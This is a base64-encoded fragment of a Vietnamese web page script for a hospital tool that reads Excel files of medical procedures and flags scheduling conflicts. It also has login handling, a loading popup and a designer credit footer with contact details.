Z0Vycm9yKGBM4buXaSBwaMOibiB0w61jaCB0aOG7nWkgZ2lhbjogJHtlcnJvci5tZXNzYWdlfWAsIHJvd0luZGV4LCB7IA0KICAgICAgICAgICAgICAgICAgICB2YWx1ZTogZGF0ZXRpbWVTdHIsDQogICAgICAgICAgICAgICAgICAgIGVycm9yRGV0YWlsczogZXJyb3Iuc3RhY2sgDQogICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgcmV0dXJuIG51bGw7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICAvLyA9PT09PT09PT09IEtI4bueSSBU4bqgTyBT4buwIEtJ4buGTiA9PT09PT09PT09IC8vDQogICAgICAgIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ0RPTUNvbnRlbnRMb2FkZWQnLCBmdW5jdGlvbigpIHsNCgkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3VzZXJuYW1lSW5wdXQnKS5mb2N1cygpOw0KICAgICAgICAgICAgLy8gS2hpIHRyYW5nIGxvYWQNCiAgICAgICAgICAgIGlmICghc2Vzc2lvblN0b3JhZ2UuZ2V0SXRlbSgnbWVkVXNlcicpKSB7DQogICAgICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5jbGFzc0xpc3QuYWRkKCdsb2dpbi1wYWdlJyk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIEtp4buDbSB0cmEgxJHEg25nIG5o4bqtcCBraGkgdHJhbmcgdOG6o2kNCgkJDQoJCQkNCiAgICAgICAgICAgIGNoZWNrU2F2ZWRMb2dpbigpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBHw6FuIHPhu7Ega2nhu4duIGNobyBuw7p0IMSRxINuZyBuaOG6rXANCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbkJ0bicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4gew0KICAgIGlzTG9naW5BY3Rpb24gPSB0cnVlOyAvLyDinIUgVGjDqm0gZMOybmcgbsOgeQ0KICAgIGNoZWNrTG9naW4oKTsNCn0pOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBHw6FuIHPhu7Ega2nhu4duIGNobyBuw7p0IMSRxINuZyB4deG6pXQNCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dvdXRCdG4nKS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsNCiAgICBpc0xvZ2luQWN0aW9uID0gZmFsc2U7IC8vIOKchSBUaMOqbSBkw7JuZyBuw6B5DQogICAgbG9nb3V0KCk7DQp9KTsNCg0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyDEkMSDbmcgbmjhuq1wIGLhurFuZyBwaMOtbSBFbnRlcg0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Bhc3N3b3JkSW5wdXQnKS5hZGRFdmVudExpc3RlbmVyKCdrZXl1cCcsIGZ1bmN0aW9uKGV2ZW50KSB7DQogICAgICAgICAgICAgICAgaWYgKGV2ZW50LmtleSA9PT0gJ0VudGVyJykgew0KICAgICAgICAgICAgICAgICAgICBjaGVja0xvZ2luKCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIEfDoW4gc+G7sSBraeG7h24gY2hvIG7DunQgcGjDom4gdMOtY2ggZmlsZQ0KICAgICAgICAgICAgDQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYW5hbHl6ZUJ0bicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgYXN5bmMgKCkgPT4gew0KICBhd2FpdCBlbnN1cmVYTFNYKCk7IC8vIG7huqFwIFhMU1ggxJHDum5nIGzDumMgZMO5bmcNCiAgICBjb25zdCBmaWxlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVJbnB1dCcpLmZpbGVzWzBdOw0KaWYgKCFmaWxlKSB7DQogICAgY29uc3QgcG9wdXAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1BvcHVwJyk7DQogICAgY29uc3QgbG9hZGluZ1RleHQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1RleHQnKTsNCiAgICBjb25zdCBwcm9ncmVzc0JhciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9ncmVzc0JhcicpOw0KDQogICAgbG9hZGluZ1RleHQuaW5uZXJIVE1MID0gYA0KICAgICAgICA8aSBjbGFzcz0iZmFzIGZhLWV4Y2xhbWF0aW9uLXRyaWFuZ2xlIiBzdHlsZT0iZm9udC1zaXplOjI0cHg7Y29sb3I6cmVkO21hcmdpbi1ib3R0b206MTBweDsiPjwvaT48YnIvPg0KICAgICAgICA8c3Ryb25nPlZ1aSBsw7JuZyBjaOG7jW4gZmlsZSB0csaw4bubYyBraGkga2nhu4NtIHRyYTwvc3Ryb25nPjxici8+PGJyLz4NCiAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIiBvbmNsaWNrPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1BvcHVwJykuc3R5bGUuZGlzcGxheT0nbm9uZSciPsSQw7NuZzwvYnV0dG9uPg0KICAgIGA7DQogICAgcHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSAnMCUnOw0KICAgIA0KICAgIHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7DQogICAgcG9wdXAuY2xhc3NMaXN0LmFkZCgnc2hvdycpOw0KICAgIHJldHVybjsNCn0NCg0KDQogICAgY29uc3QgcG9wdXAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1BvcHVwJyk7DQogICAgY29uc3QgbG9hZGluZ1RleHQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1RleHQnKTsNCiAgICBjb25zdCBwcm9ncmVzc0JhciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9ncmVzc0JhcicpOw0KDQogICAgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICdmbGV4JzsNCiAgICByZXF1ZXN0QW5pbWF0aW9uRnJhbWUoKCkgPT4gcG9wdXAuY2xhc3NMaXN0LmFkZCgnc2hvdycpKTsNCg0KICAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9ICc8aSBjbGFzcz0iZmFzIGZhLXBhcGVyLXBsYW5lIiBzdHlsZT0iZm9udC1zaXplOjI0cHg7Y29sb3I6IzM0OThkYjttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz7EkGFuZyBn4butaSBk4buvIGxp4buHdSB24buBIG3DoXkgY2jhu6cuLi4nOw0KICAgIHByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gJzMzJSc7DQoJDQoJDQoJDQoJY29uc3QgcHJvZ3Jlc3NCYXJDb250YWluZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvZ3Jlc3NCYXJDb250YWluZXInKTsNCg0KLy8gQ2jhu4kgdOG6oW8gMSBs4bqnbg0KaWYgKCFkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY3JlZGl0TGluZUJlbG93JykpIHsNCiAgY29uc3QgY3JlZGl0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogIGNyZWRpdC5pZCA9ICdjcmVkaXRMaW5lQmVsb3cnOw0KICBjcmVkaXQuaW5uZXJUZXh0ID0gJ8KpIFRoaeG6v3Qga+G6vyAmIHBow6F0IHRyaeG7g24gYuG7n2kgQ2jDonUgSHXhu7NuaCc7DQogIGNyZWRpdC5zdHlsZS5tYXJnaW5Ub3AgPSAnMTBweCc7DQogIGNyZWRpdC5zdHlsZS5mb250U2l6ZSA9ICcxNnB4JzsNCiAgY3JlZGl0LnN0eWxlLmNvbG9yID0gJyNGRjAwMDAnOw0KICBjcmVkaXQuc3R5bGUudGV4dEFsaWduID0gJ2NlbnRlcic7DQoNCiAgcHJvZ3Jlc3NCYXJDb250YWluZXIucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUoY3JlZGl0LCBwcm9ncmVzc0JhckNvbnRhaW5lci5uZXh0U2libGluZyk7DQp9DQoJDQoJDQoJDQoJDQogICAgYXdhaXQgbmV3IFByb21pc2UocmVzb2x2ZSA9PiByZXF1ZXN0QW5pbWF0aW9uRnJhbWUoKCkgPT4gc2V0VGltZW91dChyZXNvbHZlLCA1MCkpKTsNCiAgICBhd2FpdCBuZXcgUHJvbWlzZShyZXNvbHZlID0+IHNldFRpbWVvdXQocmVzb2x2ZSwgNzAwKSk7DQoNCiAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICc2NiUnOw0KDQogICAgbGV0IHRvdGFsID0gMDsNCiAgICB0cnkgew0KICAgICAgICBjb25zdCBmaWxlUmVhZGVyID0gbmV3IEZpbGVSZWFkZXIoKTsNCiAgICAgICAgY29uc3QgZGF0YSA9IGF3YWl0IG5ldyBQcm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHsNCiAgICAgICAgICAgIGZpbGVSZWFkZXIub25sb2FkID0gZSA9PiByZXNvbHZlKG5ldyBVaW50OEFycmF5KGUudGFyZ2V0LnJlc3VsdCkpOw0KICAgICAgICAgICAgZmlsZVJlYWRlci5vbmVycm9yID0gKCkgPT4gcmVqZWN0KG5ldyBFcnJvcigiTOG7l2kgxJHhu41jIGZpbGUiKSk7DQogICAgICAgICAgICBmaWxlUmVhZGVyLnJlYWRBc0FycmF5QnVmZmVyKGZpbGUpOw0KICAgICAgICB9KTsNCg0KICAgICAgICBjb25zdCB3b3JrYm9vayA9IFhMU1gucmVhZChkYXRhLCB7IHR5cGU6ICdhcnJheScgfSk7DQogICAgICAgIGNvbnN0IGZpcnN0U2hlZXQgPSB3b3JrYm9vay5TaGVldHNbd29ya2Jvb2suU2hlZXROYW1lc1sxXV07DQogICAgICAgIGNvbnN0IGpzb25EYXRhID0gWExTWC51dGlscy5zaGVldF90b19qc29uKGZpcnN0U2hlZXQsIHsNCiAgICAgICAgICAgIGhlYWRlcjogMSwNCiAgICAgICAgICAgIGRlZnZhbDogIiIsDQogICAgICAgICAgICBibGFua3Jvd3M6IHRydWUNCiAgICAgICAgfSk7DQoNCiAgICAgICAgY29uc3Qgcm93cyA9IGpzb25EYXRhLnNsaWNlKDkpOw0KICAgICAgICB0b3RhbCA9IHJvd3MubGVuZ3RoOw0KICAgIH0gY2F0Y2ggew0KICAgICAgICB0b3RhbCA9IDEwMDA7DQogICAgfQ0KDQogICAgY29uc3Qgc3RlcCA9IDEwMDsNCiAgICBjb25zdCBzdGVwcyA9IE1hdGguY2VpbCh0b3RhbCAvIHN0ZXApOw0KICAgIGNvbnN0IGludGVydmFsID0gMjYwMCAvIHN0ZXBzOw0KDQogICAgZm9yIChsZXQgaSA9IDE7IGkgPD0gc3RlcHM7IGkrKykgew0KICAgICAgICBjb25zdCBjdXJyZW50ID0gTWF0aC5taW4oaSAqIHN0ZXAsIHRvdGFsKTsNCiAgICAgICAgbG9hZGluZ1RleHQuaW5uZXJIVE1MID0gJzxpIGNsYXNzPSJmYXMgZmEtdXNlci1tZCIgc3R5bGU9ImZvbnQtc2l6ZToyNHB4O2NvbG9yOiMyOTgwYjk7bWFyZ2luLWJvdHRvbToxMHB4OyI+PC9pPjxici8+xJBhbmcgcGjDom4gdMOtY2ggZOG7ryBsaeG7h3UgdOG7q25nIGLhu4duaCBuaMOibi4uLjxicj4nICsgY3VycmVudCArICcgLyAnICsgdG90YWw7DQogICAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHIgPT4gc2V0VGltZW91dChyLCBpbnRlcnZhbCkpOw0KICAgIH0NCg0KICAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9ICc8aSBjbGFzcz0iZmFzIGZhLWNoZWNrLWNpcmNsZSIgc3R5bGU9ImZvbnQtc2l6ZToyNHB4O2NvbG9yOmdyZWVuO21hcmdpbi1ib3R0b206MTBweDsiPjwvaT48YnIvPsSQw6Mga2nhu4NtIHRyYSB4b25nLi4uJzsNCiAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICcxMDAlJzsNCiAgICBhd2FpdCBuZXcgUHJvbWlzZShyZXNvbHZlID0+IHNldFRpbWVvdXQocmVzb2x2ZSwgMTAwMCkpOw0KDQppZiAoIXdpbmRvdy5pc0tob2FMb2kpIHsNCiAgICBwb3B1cC5jbGFzc0xpc3QucmVtb3ZlKCdzaG93Jyk7DQogICAgc2V0VGltZW91dCgoKSA9PiB7IHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7IH0sIDUwMCk7DQoNCg0KfQ0KDQoNCg0KIGVsc2Ugew0KICAgIC8vIE7hur91IMSRYW5nIGzhu5dpIEtob2EsIEtIw5RORyDEkcaw4bujYyDhuqluIHBvcHVwDQogICAgcG9wdXAuY2xhc3NMaXN0LmFkZCgnc2hvdycpOw0KICAgIHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7DQp9DQogICAgaGFuZGxlRmlsZSgpOw0KCQ0KCQ0KCQ0KCQ0Kc2V0VGltZW91dCgoKSA9PiB7DQogICAgLy8g4p2MIE7hur91IMSRYW5nIGzhu5dpIHTDqm4ga2hvYSB0aMOsIGdp4buvIG5ndXnDqm4gcG9wdXAsIEtIw5RORyDEkcaw4bujYyDhuqluLCBLSMOUTkcgaGnhu4duIG7DunQNCiAgICBpZiAod2luZG93LmlzS2hvYUxvaSkgew0KICAgICAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KICAgICAgICBwb3B1cC5jbGFzc0xpc3QuYWRkKCdzaG93Jyk7DQogICAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICAvLyDinIUgTuG6v3Uga2jDtG5nIGzhu5dpLCB0aMOsIOG6qW4gcG9wdXAgdsOgIGhp4buHbiBuw7p0IGNo4bupYyBuxINuZw0KICAgIHBvcHVwLmNsYXNzTGlzdC5yZW1vdmUoJ3Nob3cnKTsNCiAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KDQogICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnYnV0dG9uLmJ0bicpLmZvckVhY2goYnRuID0+IHsNCiAgICAgICAgaWYgKGJ0bi50ZXh0Q29udGVudC5pbmNsdWRlcygnR2nhu50gdHLhu5FuZycpIHx8IGJ0bi50ZXh0Q29udGVudC5pbmNsdWRlcygnU+G6r2MgdGh14buRYyB0aGFuZycpKSB7DQogICAgICAgICAgICBidG4uc3R5bGUuZGlzcGxheSA9ICdpbmxpbmUtYmxvY2snOw0KICAgICAgICB9DQogICAgfSk7DQp9LCA1MDApOw0KDQoNCgkNCgkNCgkgICAgLy8gQ+G6rXAgbmjhuq10IGfhu6NpIMO9IGtoaSB0aGF5IMSR4buVaSB0w7l5IGNo4buNbiB0aOG7nWkgZ2lhbg0KIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2lucHV0W25hbWU9InRpbWVPcHRpb24iXScpLmZvckVhY2gocmFkaW8gPT4gew0KICAgICAgICByYWRpby5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmdW5jdGlvbigpIHsNCiAgICAgICAgICAgIGlmIChtYWNoaW5lQ29uZmxpY3RMb2cgJiYgbWFjaGluZUNvbmZsaWN0TG9nLmxlbmd0aCA+IDApIHsNCiAgICAgICAgICAgICAgICBnZW5lcmF0ZU1hY2hpbmVUaW1lU3VnZ2VzdGlvbnMoKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSk7DQogICAgfSk7DQoNCiAgICAvLyBD4bqtcCBuaOG6rXQgZ+G7o2kgw70ga2hpIHRoYXkgxJHhu5VpIHPhu5EgbMaw4bujbmcga2h1bmcgZ2nhu50NCiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd01vcmVTdWdnZXN0aW9uc0NoZWNrYm94JykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZnVuY3Rpb24oKSB7DQogICAgICAgIGlmIChtYWNoaW5lQ29uZmxpY3RMb2cgJiYgbWFjaGluZUNvbmZsaWN0TG9nLmxlbmd0aCA+IDApIHsNCiAgICAgICAgICAgIGdlbmVyYXRlTWFjaGluZVRpbWVTdWdnZXN0aW9ucygpOw0KICAgICAgICB9DQogICAgfSk7DQoJDQoJDQp9KTsNCg0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBHw6FuIHPhu7Ega2nhu4duIGNobyBkcm9wZG93biBs4buNYw0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29wZXJhdG9yU2VsZWN0JykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZmlsdGVyQnlPcGVyYXRvcik7DQogICAgICAgICAgICANCgkJCQ0KCQkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dEb2N0b3JDaGVja2JveCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZpbHRlckJ5T3BlcmF0b3IpOw0KCQkJDQoJCQkNCiAgICAgICAgICAgIC8vIEfDoW4gc+G7sSBraeG7h24gY2hvIHJhZGlvIGJ1dHRvbiBjaOG7jW4ga2h1bmcgZ2nhu50NCiAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2lucHV0W25hbWU9InRpbWVPcHRpb24iXScpLmZvckVhY2gocmFkaW8gPT4gew0KICAgICAgICAgICAgICAgIHJhZGlvLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uKCkgew0KICAgICAgICAgICAgICAgICAgICBpZiAoYWxsUHJvY2VkdXJlcy5sZW5ndGggPiAwKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBnZW5lcmF0ZVRpbWVTdWdnZXN0aW9ucyhhbGxQcm9jZWR1cmVzKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGZpbHRlckJ5T3BlcmF0b3IoKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfSk7DQoJCQkNCgkJCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcGVyYXRvclNlbGVjdCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uKCkgew0KICAgIGZpbHRlckJ5T3BlcmF0b3IoKTsNCn0pOw0KDQogZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29wZXJhdG9yU2VsZWN0RXJyb3InKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmdW5jdGlvbiAoKSB7DQogICAvLyBjaOG7iSByZW5kZXIgbOG6oWksIEtIw5RORyDEkeG7pW5nIGRyb3Bkb3duIGLDqm4ga2lhDQogICBmaWx0ZXJCeU9wZXJhdG9yKCk7DQogfSk7DQoJCQkNCiAgICAgICAgfSk7DQogICAgPC9zY3JpcHQ+DQo8ZGl2IGNsYXNzPSJwcm9jZWR1cmUtaW5mbyI+PGNlbnRlcj4gDQpEZXNpZ24gQnkgPGEgaHJlZj0iaHR0cDovL2ZiLmNvbS9jaGF1aHV5bmgwMTA0IiB0YXJnZXQ9Il9ibGFuayI+IERyLkNow6J1PC9hPjxici8+DQogICAgICAgICAgICAgICAgTuG6v3UgQ8OzIELhuqV0IEvhu7MgVsaw4bubbmcgTeG6r2MgR8OsIFZ1aSBMw7JuZyBMSCA6IDxici8+DQogICAgICAgICAgICAgICAgRW1haWw6IGNoYXVodXluaDAxMDRAZ21haWwuY29tPGJyLz4NCiAgICAgICAgICAgICAgICBTRFQ6IDA3OS41NjcuOTM1MDwvY2VudGVyPg0KPC9kaXY+DQoNCg0KDQo8c2NyaXB0Pg0KICAvLyBI4buXIHRy4bujIG5o4bqlbiBFbnRlciB04burIMO0IHVzZXJuYW1lIGhv4bq3YyBwYXNzd29yZA0KICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndXNlcm5hbWVJbnB1dCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2tleXVwJywgZnVuY3Rpb24oZXZlbnQpIHsNCiAgICBpZiAoZXZlbnQua2V5ID09PSAnRW50ZXInKSB7DQogICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGFzc3dvcmRJbnB1dCcpLmZvY3VzKCk7DQogICAgfQ0KICB9KTsNCg0KICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGFzc3dvcmRJbnB1dCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2tleXVwJywgZnVuY3Rpb24oZXZlbnQpIHsNCiAgICBpZiAoZXZlbnQua2V5ID09PSAnRW50ZXInKSB7DQogICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5CdG4nKS5jbGljaygpOw0KICAgIH0NCiAgfSk7DQoNCi8vID09PT09PSBU4buwIMSQ4buYTkcgUVXDiVQgVEjGryBN4bukQyAmIENI4buMTiBGSUxFIE3hu5pJIE5I4bqkVCA9PT09PT0NCg0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZvbGRlckJ0bicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4gew0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmb2xkZXJJbnB1dCcpLmNsaWNrKCk7DQp9KTsNCg0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZvbGRlcklucHV0JykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgYXN5bmMgKGUpID0+IHsNCiBhd2FpdCBlbnN1cmVYTFNYKCk7IC8vIG7huqFwIFhMU1ggdHLGsOG7m2Mga2hpIMSR4buNYyB3b3JrYm9vaw0KICAgIGNvbnN0IGZpbGVzID0gQXJyYXkuZnJvbShlLnRhcmdldC5maWxlcykuZmlsdGVyKGYgPT4gL1wuKHhsc3h8eGxzfGNzdikkL2kudGVzdChmLm5hbWUpKTsNCiAgICBjb25zdCBzdGF0dXNEaXYgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2NhblN0YXR1cycpOw0KICAgIGNvbnN0IGZpbGVJbnB1dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlSW5wdXQnKTsNCg0KICAgIGlmIChmaWxlcy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgc3RhdHVzRGl2LnN0eWxlLmNvbG9yID0gJ3JlZCc7DQogICAgICAgIHN0YXR1c0Rpdi5pbm5lckhUTUwgPSAnS2jDtG5nIHTDrG0gdGjhuqV5IGZpbGUgRXhjZWwgaOG7o3AgbOG7hyB0cm9uZyB0aMawIG3hu6VjLic7DQogICAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICBsZXQgdmFsaWRGaWxlID0gbnVsbDsNCg0KICAgIGZvciAoY29uc3QgZmlsZSBvZiBmaWxlcy5zb3J0KChhLCBiKSA9PiBiLmxhc3RNb2RpZmllZCAtIGEubGFzdE1vZGlmaWVkKSkgew0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgY29uc3QgZGF0YSA9IGF3YWl0IGZpbGUuYXJyYXlCdWZmZXIoKTsNCiAgICAgICAgICAgIGNvbnN0IHdvcmtib29rID0gWExTWC5yZWFkKGRhdGEsIHsgdHlwZTogJ2FycmF5JyB9KTsNCg0KICAgICAgICAgICAgaWYgKCF3b3JrYm9vay5TaGVldE5hbWVzWzFdKSBjb250aW51ZTsgLy8gY+G6p24gU2hlZXQgdGjhu6kgMg0KDQogICAgICAgICAgICBjb25zdCBzaGVldCA9IHdvcmtib29rLlNoZWV0c1t3b3JrYm9vay5TaGVldE5hbWVzWzFdXTsNCiAgICAgICAgICAgIGNvbnN0IGpzb25EYXRhID0gWExTWC51dGlscy5zaGVldF90b19qc29uKHNoZWV0LCB7IGhlYWRlcjogMSwgZGVmdmFsOiAiIiwgYmxhbmtyb3dzOiB0cnVlIH0pOw0KDQogICAgICAgICAgICBpZiAoanNvbkRhdGEubGVuZ3RoID49IDEwKSB7IC8vIMOtdCBuaOG6pXQgMiBkw7JuZyBoZWFkZXIgdsOgIGPDsyBk4buvIGxp4buHdSBkw7JuZyAxMA0KICAgICAgICAgICAgICAgIHZhbGlkRmlsZSA9IGZpbGU7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICB9DQogICAgICAgIH0gY2F0Y2ggKGVycikgew0KICAgICAgICAgICAgY29uc29sZS5lcnJvcihgTOG7l2kgxJHhu41jIGZpbGUgJHtmaWxlLm5hbWV9OmAsIGVycik7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICBpZiAodmFsaWRGaWxlKSB7DQogICAgICAgIGNvbnN0IGR0ID0gbmV3IERhdGFUcmFuc2ZlcigpOw0KICAgICAgICBkdC5pdGVtcy5hZGQodmFsaWRGaWxlKTsNCiAgICAgICAgZmlsZUlucHV0LmZpbGVzID0gZHQuZmlsZXM7DQoNCiAgICAgICAgLy8gY+G6rXAgbmjhuq10IHRy4bqhbmcgdGjDoWkNCiAgICAgICAgc3RhdHVzRGl2LmlubmVySFRNTCA9IGA8aSBjbGFzcz0iZmFzIGZhLWZvbGRlci1vcGVuIj48L2k+IMSQw6MgY2jhu41uIGZpbGU6IDxiPiR7dmFsaWRGaWxlLm5hbWV9PC9iPmA7DQogICAgICAgIHN0YXR1c0Rpdi5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgICAgc3RhdHVzRGl2LnN0eWxlLmNvbG9yID0gJyMyYzNlNTAnOw0KDQogICAgICAgIC8vIEfhu41pIGtp4buDbSB0cmENCiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2FuYWx5emVCdG4nKS5jbGljaygpOw0KICAgIH0gZWxzZSB7DQogICAgICAgIHN0YXR1c0Rpdi5zdHlsZS5jb2xvciA9ICdyZWQnOw0KICAgICAgICBzdGF0dXNEaXYuaW5uZXJIVE1MID0gJ0tow7RuZyB0w6xtIMSRxrDhu6NjIGZpbGUgY8OzIGPhuqV1IHRyw7pjIGjhu6NwIGzhu4cuIFZ1aSBsw7JuZyBraeG7g20gdHJhIGzhuqFpLic7DQogICAgfQ0KfSk7DQoNCg0KPC9zY3JpcHQ+DQo8ZGl2IGNsYXNzPSJ0b2FzdCIgaWQ9InRvYXN0Ij48L2Rpdj4NCjwhLS0gUG9wdXAgbG9hZGluZyAtLT4NCjxkaXYgaWQ9ImxvYWRpbmdQb3B1cCIgc3R5bGU9ImRpc3BsYXk6bm9uZTtwb3NpdGlvbjpmaXhlZDt0b3A6MDtsZWZ0OjA7d2lkdGg6MTAwJTtoZWlnaHQ6MTAwJTtiYWNrZ3JvdW5kOnJnYmEoMCwwLDAsMC41KTt6LWluZGV4Ojk5OTk7anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7Zm9udC1mYW1pbHk6J0ludGVyJyxzYW5zLXNlcmlmIj4NCjxkaXYgc3R5bGU9ImJhY2tncm91bmQ6I2ZmZjtwYWRkaW5nOjMwcHggNDBweDtib3JkZXItcmFkaXVzOjEwcHg7dGV4dC1hbGlnbjpjZW50ZXI7Ym94LXNoYWRvdzowIDAgMTVweCByZ2JhKDAsMCwwLDAuMyk7bWF4LXdpZHRoOjkwJTtmb250LXNpemU6MThweCI+DQo8ZGl2IGlkPSJsb2FkaW5nVGV4dCI+DQo8aSBjbGFzcz0iZmFzIGZhLXNwaW5uZXIgZmEtc3BpbiIgc3R5bGU9ImZvbnQtc2l6ZToyNHB4O2NvbG9yOiMzNDk4ZGI7bWFyZ2luLWJvdHRvbToxMHB4OyI+PC9pPjxici8+DQogICAgICDEkGFuZyBn4butaSBk4buvIGxp4buHdSB24buBIG3DoXkgY2jhu6cuLi4NCiAgICA8L2Rpdj4NCjxkaXYgaWQ9InByb2dyZXNzQmFyQ29udGFpbmVyIj4NCjxkaXYgaWQ9InByb2dyZXNzQmFyIj48L2Rpdj4NCjxkaXYgaWQ9ImF2YWlsYWJpbGl0eVRhYmxlIiBzdHlsZT0iZGlzcGxheTogbm9uZTsgbWFyZ2luLXRvcDogMjBweDsiPg0KICA8aDI+VGjhu5FuZyBrw6ogZ2nhu50gdHLhu5FuZyB04burbmcgbmfGsOG7nWk8L2gyPg0KICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIj4NCiAgICA8dGhlYWQ+DQogICAgICA8dHI+DQogICAgICAgIDx0aD5OZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgPHRoPk5nw6B5PC90aD4NCiAgICAgICAgDQogICAgICAgIDx0aD5HaeG7nSB0cuG7kW5nIGJ14buVaSBzw6FuZzwvdGg+DQogICAgICAgIDx0aD5HaeG7nSB0cuG7kW5nIGJ14buVaSBjaGnhu4F1PC90aD4NCiAgICAgIDwvdHI+DQogICAgPC90aGVhZD4NCiAgICA8dGJvZHkgaWQ9ImF2YWlsYWJpbGl0eUJvZHkiPjwvdGJvZHk+DQogIDwvdGFibGU+DQo8L2Rpdj4NCjwhLS0gS+G6vlQgVEjDmkM6IELhuqJORyBHSeG7nCBUUuG7kE5HIFThu6pORyBOR8av4bucSSAtLT4NCjwvZGl2P